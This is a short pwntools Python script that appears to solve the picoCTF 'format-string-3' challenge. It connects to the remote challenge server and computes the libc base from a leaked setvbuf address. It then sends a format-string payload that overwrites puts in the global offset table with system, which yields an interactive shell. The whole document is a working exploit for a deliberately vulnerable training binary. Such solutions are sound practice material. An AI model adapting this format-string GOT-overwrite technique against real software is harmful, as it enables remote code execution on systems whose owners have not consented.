from pwn import *

e = ELF('./format-string-3')
libc = ELF('./libc.so.6')

context.binary = e

#p = process(e.path)
p = remote('rhea.picoctf.net', 49171)

#get libc offset

p.recvuntil(b'libc:')

libc.address = int(p.recvline(keepends = False), 16) - libc.sym['setvbuf']

log.info('Libc base: ' + hex(libc.address))

#overwrite puts got with system, when puts takes '/bin/sh' as parameter it will instead call

s = fmtstr_payload(38, {e.got['puts']: libc.sym['system']})

p.sendline(s)

#pray for flag

p.interactive()
